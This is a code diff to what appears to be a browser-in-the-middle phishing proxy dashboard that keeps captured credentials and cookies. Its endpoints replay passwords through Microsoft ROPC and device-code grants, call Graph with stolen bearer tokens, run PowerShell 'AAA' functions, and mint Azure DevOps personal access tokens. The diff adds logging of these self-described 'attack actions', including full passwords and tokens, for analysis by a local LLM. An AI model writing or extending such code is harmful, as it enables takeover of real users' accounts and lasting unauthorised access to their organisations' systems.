@@ -43,7 +43,7 @@ from backend.routes import capture as capture_routes
 credentials_store = JsonStore("credentials")
 cookies_store = JsonStore("cookies")
 
-app = FastAPI(title="BITM Proxy Debug", version="1.37.0")
+app = FastAPI(title="BITM Proxy Debug", version="1.38.0")
 
 app.add_middleware(APIKeyMiddleware)
 app.include_router(browser_routes.router, prefix="/api/browser", tags=["browser"])
@@ -1304,15 +1304,20 @@ async def api_test_graph(body: dict):
     import httpx
     token = body.get("token", "").strip()
     url = body.get("url", "https://graph.microsoft.com/v1.0/me").strip()
+    _sid = (body.get("site_id") or "").strip()
     if not token:
         return {"error": "No token provided"}
     try:
         async with httpx.AsyncClient(timeout=10.0, verify=False) as client:
             resp = await client.get(url, headers={"Authorization": f"Bearer {token}"})
+            resp_text = resp.text
             try:
                 resp_body = resp.json()
             except Exception:
-                resp_body = resp.text[:2000]
+                resp_body = resp_text[:2000]
+            _record_test_flow(_sid, "graph", "GET", url,
+                              {"Authorization": "Bearer " + token[:24] + "…"}, "",
+                              resp.status_code, dict(resp.headers), resp_text)
             return {
                 "status_code": resp.status_code,
                 "success": 200 <= resp.status_code < 300,
@@ -1365,29 +1370,75 @@ async def api_test_ropc(body: dict):
     # for first-party scenarios so ROPC doesn't need its own app registration.
     client_id = (body.get("client_id") or "29d9ed98-a469-4536-ade2-f981bc1d605e").strip()
     scope = (body.get("scope") or "https://graph.microsoft.com/.default openid profile offline_access").strip()
-    return await _ropc_grant(username, password, tenant, client_id, scope)
+    return await _ropc_grant(username, password, tenant, client_id, scope,
+                             site_id=(body.get("site_id") or "").strip(), tool="ropc")
+
+
+def _test_trace_id(site_id: str, tool: str) -> str:
+    """Flow-trace session id for a dashboard test: unique per (credential, tool)
+    so each tool's runs accumulate in their own selectable trace."""
+    return f"test_{tool}_{site_id}"
+
+
+def _record_test_flow(site_id, tool, method, url, req_headers, req_body,
+                      status, resp_headers, resp_body):
+    """Append a dashboard test (ROPC / v1+v2 token / ADO PAT / device-code /
+    AAA / Graph) to a per-(credential, tool) flow trace `test_<tool>_<site_id>`,
+    as a full request/response entry. This puts the operator's attack actions on
+    the Flow Trace timeline — one trace per tool per credential — so each can be
+    analyzed by the local LLM or exported to RAG/Burp. Stores full bodies (incl.
+    passwords / tokens / PATs) by design — local-only analysis; encrypted at
+    rest when CREDENTIAL_PASSPHRASE is set."""
+    if not site_id or not tool:
+        return
+    try:
+        import time as _t
+        from backend.shared import append_flow
+        now = _t.time()
+        append_flow(_test_trace_id(site_id, tool), {
+            "req_id": f"test-{int(now * 1000)}",
+            "method": method, "url": url, "status": status,
+            "request_headers": req_headers or {},
+            "request_body": req_body if req_body is not None else "",
+            "response_headers": resp_headers or {},
+            "response_body": resp_body if resp_body is not None else "",
+            "ts_req": now, "ts_resp": now,
+            "source": "dashboard-test",
+        })
+    except Exception as e:
+        append_log("warn", "auth_proxy", f"record_test_flow failed: {e}")
 
 
 async def _do_token_post(url: str, data: dict, username: str, tenant: str,
-                         label: str = "TOKEN") -> dict:
+                         label: str = "TOKEN", site_id: str = "",
+                         tool: str = "") -> dict:
     """Core password-grant POST + response parse, shared by the v2 ROPC path
     (_ropc_grant) and the v1+v2 /api/test-token comparison. Returns the
     structured shape all consumers expect: on success {ok:True, access_token,
     url, ...}; on a blocked grant {ok:False, aadsts_code, url, error,
     error_description} so callers can surface the AADSTS code as the finding.
-    `label` prefixes the audit log line (ROPC_SUCCESS / TOKEN_V1_BLOCKED …)."""
+    `label` prefixes the audit log line (ROPC_SUCCESS / TOKEN_V1_BLOCKED …).
+    When `site_id` is set, the full request/response is recorded to that
+    credential's `tests_<site_id>` flow trace."""
     import re
     import httpx
+    from urllib.parse import urlencode
+    req_headers = {"Content-Type": "application/x-www-form-urlencoded"}
+    req_body = urlencode(data)
     try:
         async with httpx.AsyncClient(timeout=15.0, verify=False) as client:
-            resp = await client.post(url, data=data,
-                                      headers={"Content-Type": "application/x-www-form-urlencoded"})
+            resp = await client.post(url, data=data, headers=req_headers)
+            resp_text = resp.text
             try:
                 resp_body = resp.json()
             except Exception:
-                resp_body = {"raw": resp.text[:2000]}
+                resp_body = {"raw": resp_text[:2000]}
     except Exception as e:
+        _record_test_flow(site_id, tool, "POST", url, req_headers, req_body, 0, {}, f"error: {e}")
         return {"error": str(e), "url": url}
+
+    _record_test_flow(site_id, tool, "POST", url, req_headers, req_body,
+                      resp.status_code, dict(resp.headers), resp_text)
 
     if resp.status_code == 200 and resp_body.get("access_token"):
         append_log("info", "auth_proxy",
@@ -1410,13 +1461,15 @@ async def _do_token_post(url: str, data: dict, username: str, tenant: str,
 
 
 async def _ropc_grant(username: str, password: str, tenant: str,
-                      client_id: str, scope: str) -> dict:
+                      client_id: str, scope: str, site_id: str = "",
+                      tool: str = "ropc") -> dict:
     """v2 ROPC (grant_type=password → /oauth2/v2.0/token) used by
     /api/test-ropc and /api/create-ado-pat."""
     url = f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token"
     data = {"grant_type": "password", "client_id": client_id,
             "username": username, "password": password, "scope": scope}
-    return await _do_token_post(url, data, username, tenant, label="ROPC")
+    return await _do_token_post(url, data, username, tenant, label="ROPC",
+                                site_id=site_id, tool=tool)
 
 
 @app.post("/api/test-token")
@@ -1447,14 +1500,15 @@ async def api_test_token(body: dict):
     resource = (body.get("resource") or "https://graph.microsoft.com").strip()
     scope = (body.get("scope") or "https://graph.microsoft.com/.default openid profile offline_access").strip()
     import asyncio
+    _sid = (body.get("site_id") or "").strip()
     base = f"https://login.microsoftonline.com/{tenant}"
     v1_data = {"grant_type": "password", "client_id": client_id,
                "username": username, "password": password, "resource": resource}
     v2_data = {"grant_type": "password", "client_id": client_id,
                "username": username, "password": password, "scope": scope}
     v1, v2 = await asyncio.gather(
-        _do_token_post(f"{base}/oauth2/token", v1_data, username, tenant, label="TOKEN_V1"),
-        _do_token_post(f"{base}/oauth2/v2.0/token", v2_data, username, tenant, label="TOKEN_V2"))
+        _do_token_post(f"{base}/oauth2/token", v1_data, username, tenant, label="TOKEN_V1", site_id=_sid, tool="token"),
+        _do_token_post(f"{base}/oauth2/v2.0/token", v2_data, username, tenant, label="TOKEN_V2", site_id=_sid, tool="token"))
     return {"v1": v1, "v2": v2}
 
 
@@ -1519,18 +1573,27 @@ async def api_ado_devicecode_poll(body: dict):
     device_code = (body.get("device_code") or "").strip()
     if not device_code:
         return {"error": "device_code required"}
+    _sid = (body.get("site_id") or "").strip()
+    _tool = (body.get("tool") or "").strip()
     url = f"https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token"
+    from urllib.parse import urlencode as _ue
     data = {"grant_type": "urn:ietf:params:oauth:grant-type:device_code",
             "client_id": client_id, "device_code": device_code}
     try:
         async with httpx.AsyncClient(timeout=20.0, verify=False) as client:
             r = await client.post(url, data=data)
+            r_text = r.text
             d = r.json()
     except Exception as e:
         return {"error": f"{type(e).__name__}: {e}"}
     if d.get("access_token"):
         append_log("info", "auth_proxy",
                    f"ADO_DEVICECODE_TOKEN tenant={tenant} — device-code grant completed")
+        # Record only the *completed* device-code exchange (not every pending
+        # poll) into the tool's trace.
+        _record_test_flow(_sid, _tool, "POST", url,
+                          {"Content-Type": "application/x-www-form-urlencoded"},
+                          _ue(data), r.status_code, dict(r.headers), r_text)
         return {"ok": True, "access_token": d["access_token"]}
     err = d.get("error") or ""
     if err in ("authorization_pending", "slow_down"):
@@ -1575,6 +1638,7 @@ async def api_create_ado_pat(body: dict):
     import httpx
 
     # --- 1. acquire an ADO-scoped AAD token -------------------------------
+    _sid = (body.get("site_id") or "").strip()
     token = (body.get("access_token") or "").strip()
     token_source = "provided"
     if not token:
@@ -1585,7 +1649,8 @@ async def api_create_ado_pat(body: dict):
         tenant = (body.get("tenant_id") or "organizations").strip()
         client_id = (body.get("client_id") or _AZ_CLI_CLIENT_ID).strip()
         ropc = await _ropc_grant(username, password, tenant, client_id,
-                                 f"{_ADO_RESOURCE_ID}/.default")
+                                 f"{_ADO_RESOURCE_ID}/.default",
+                                 site_id=_sid, tool="adopat")
         if not ropc.get("ok"):
             # Surface the ROPC failure verbatim (incl. aadsts_code) so the UI
             # renders it as the finding, exactly like the ROPC panel does.
@@ -1648,18 +1713,26 @@ async def api_create_ado_pat(body: dict):
     pat_body = {"displayName": display_name, "scope": pat_scope,
                 "validTo": valid_to, "allOrgs": all_orgs}
     url = f"https://vssps.dev.azure.com/{organization}/_apis/tokens/pats?api-version=7.1-preview.1"
+    import json as _json
     try:
         # 30s for the same vssps-handshake-latency reason as the discovery call.
         async with httpx.AsyncClient(timeout=30.0, verify=False) as client:
             resp = await client.post(url, headers={**headers, "Content-Type": "application/json"},
                                       json=pat_body)
+            resp_text = resp.text
             try:
                 resp_body = resp.json()
             except Exception:
-                resp_body = {"raw": resp.text[:2000]}
+                resp_body = {"raw": resp_text[:2000]}
     except Exception as e:
+        _record_test_flow(_sid, "adopat", "POST", url,
+                          {"Authorization": "Bearer <ADO-token>", "Content-Type": "application/json"},
+                          _json.dumps(pat_body), 0, {}, f"error: {e}")
         return {"error": str(e), "stage": "create", "organization": organization,
                 "token_source": token_source}
+    _record_test_flow(_sid, "adopat", "POST", url,
+                      {"Authorization": "Bearer <ADO-token>", "Content-Type": "application/json"},
+                      _json.dumps(pat_body), resp.status_code, dict(resp.headers), resp_text)
 
     pt = resp_body.get("patToken") if isinstance(resp_body, dict) else None
     if resp.status_code < 300 and pt and pt.get("token"):
@@ -1717,7 +1790,17 @@ async def api_aaa_run(body: dict):
     data = credentials_store.get(site_id)
     if not data:
         return {"ok": False, "error": f"no credentials for site_id={site_id!r}"}
-    return await _aaa.run(site_id, data, function, args, token_index)
+    res = await _aaa.run(site_id, data, function, args, token_index)
+    # AAA runs pwsh against Graph (not a single HTTP call we can capture), so
+    # record a synthetic entry: the function + args as the "request", the
+    # captured stdout as the "response".
+    import json as _json
+    _record_test_flow(
+        site_id, "aaa", "AAA", f"aaa://{function}",
+        {}, _json.dumps({"function": function, "args": args}),
+        res.get("exit_code") if isinstance(res, dict) else None,
+        {}, (res.get("stdout") or res.get("error") or "") if isinstance(res, dict) else "")
+    return res
 
 
 @app.post("/api/aaa/login")
@@ -8247,7 +8330,7 @@ async function aaaLoginDeviceCode(siteId){
   const tick=async()=>{
     if(Date.now()>deadline){st.innerHTML='<span style="color:#f87171">✗ device code expired — Start device code again</span>';return}
     try{
-      const r=await apiFetch('/api/ado-devicecode/poll',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tenant_id:tid,client_id:cid,device_code:dc})});
+      const r=await apiFetch('/api/ado-devicecode/poll',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tenant_id:tid,client_id:cid,device_code:dc,site_id:siteId,tool:'aaa'})});
       const d=await r.json();
       if(d.ok&&d.access_token){
         st.innerHTML='<span style="color:#4ade80">✓ signed in — stashing token…</span>';
@@ -8304,7 +8387,7 @@ async function tokenRun(siteId){
   if(!user||!pass){out.innerHTML='<div style="color:#f87171">user and password are both required</div>';return}
   out.innerHTML='<div style="color:#94a3b8">Requesting tokens from v1 + v2 (grant_type=password)…</div>';
   try{
-    const r=await apiFetch('/api/test-token',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:user,password:pass,tenant_id:tid,client_id:cid})});
+    const r=await apiFetch('/api/test-token',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({site_id:siteId,username:user,password:pass,tenant_id:tid,client_id:cid})});
     const d=await r.json();
     if(d.error&&!d.v1&&!d.v2){out.innerHTML='<div style="color:#f87171">'+esc(d.error)+'</div>';return}
     out.innerHTML=`<div style="display:flex;gap:8px;flex-wrap:wrap;align-items:stretch">
@@ -8330,7 +8413,7 @@ async function ropcRun(siteId){
   if(!user||!pass){out.innerHTML='<div style="color:#f87171">user and password are both required</div>';return}
   out.innerHTML='<div style="color:#94a3b8">Requesting token (grant_type=password)…</div>';
   try{
-    const r=await apiFetch('/api/test-ropc',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:user,password:pass,tenant_id:tid,client_id:cid})});
+    const r=await apiFetch('/api/test-ropc',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({site_id:siteId,username:user,password:pass,tenant_id:tid,client_id:cid})});
     const d=await r.json();
     if(d.error&&!d.aadsts_code){out.innerHTML='<div style="color:#f87171">'+esc(d.error)+'</div>';return}
     if(!d.ok){
@@ -8378,7 +8461,7 @@ async function _adoPatCreate(siteId, creds, statusMsg){
   const allOrgs=!!document.getElementById('adopat-allorgs-'+siteId)?.checked;
   out.innerHTML='<div style="color:#94a3b8">'+esc(statusMsg||'creating PAT…')+'</div>';
   try{
-    const body=Object.assign({tenant_id:tid,organization:org,display_name:name,
+    const body=Object.assign({site_id:siteId,tenant_id:tid,organization:org,display_name:name,
       scope:scope,valid_days:days,all_orgs:allOrgs}, creds||{});
     const r=await apiFetch('/api/create-ado-pat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(body)});
     const d=await r.json();
@@ -8446,7 +8529,7 @@ async function adoPatDeviceCode(siteId){
   const tick=async()=>{
     if(Date.now()>deadline){st.innerHTML='<span style="color:#f87171">✗ device code expired — Start device code again</span>';return}
     try{
-      const r=await apiFetch('/api/ado-devicecode/poll',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tenant_id:tid,client_id:cid,device_code:dc})});
+      const r=await apiFetch('/api/ado-devicecode/poll',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({tenant_id:tid,client_id:cid,device_code:dc,site_id:siteId,tool:'adopat'})});
       const d=await r.json();
       if(d.ok&&d.access_token){st.innerHTML='<span style="color:#4ade80">✓ signed in — minting PAT…</span>';return _adoPatCreate(siteId,{access_token:d.access_token},'device-code token → discover org → create PAT…');}
       if(d.pending){if(d.slow_down)poll+=5000;setTimeout(tick,poll);return}
